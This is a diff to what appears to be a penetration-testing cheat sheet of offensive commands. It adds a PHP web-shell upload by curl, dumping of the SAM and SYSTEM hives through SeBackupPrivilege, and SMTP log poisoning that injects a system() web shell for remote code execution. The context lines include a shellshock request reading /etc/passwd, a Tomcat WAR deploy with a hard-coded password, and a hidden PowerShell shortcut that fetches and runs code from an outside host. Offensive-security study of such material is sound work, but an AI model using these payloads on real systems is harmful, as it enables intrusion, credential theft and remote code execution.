@@ -61,6 +61,9 @@ ad-ldap-enum.py -l 10.10.10.10 -d domain.local
 [escape rbash]
 ssh user@10.10.10.51 sh
 
+[ssh with different key format]
+ssh alice@10.10.10.10 -c 3des-cbc
+
 [sshutle]
 sshuttle -vr sshuser@10.10.110.74 192.168.20.0/24
 sshuttle -vr root@10.200.48.200 --ssh-cmd "ssh -i id_rsa.bak" 10.200.48.200/24
@@ -128,6 +131,9 @@ $ icacls services\monitor1.exe
 
 [tomcat curl upload]
 curl -u 'tomcat:$3cureP4s5w0rd123!' --upload-file hehe.war http://10.10.10.194:8080/manager/text/deploy?path=/application
+
+[curl upload file]
+curl -X POST -F 'file=@./shell.php' -F 'secure=val1d' -b 'admin=&G6u@B6uDXMq&Ms' http://192.168.0.183/ajax.php
 
 [shellshock]
 curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://10.10.10.10
@@ -931,4 +937,25 @@ $shortcut.Description = "Totally Notmal"
 $shortcut.HotKey = "F6"
 $shortcut.Arguments = "-windowstyle hidden iex(iwr -usebasicparsing http://charmys.hopto.org:5269)"
 $shortcut.save()
+```
+
+[SeBackupPrivilege]
+# able to dump SAM password
+cd c:\
+mkdir Temp
+reg save hklm\sam c:\Temp\sam
+reg save hklm\system c:\Temp\system
+
+[log poisoning: smtp]
+```
+#-----[/var/log/mail.log]-----
+nc 10.10.10.10 25
+
+HELO test
+MAIL FROM: "test <?php system($_GET['cmd']);?>"
+RCPT TO: root
+DATA
+.
+#RCE
+?page=/var/log/mail&cmd=ls -la
 ```
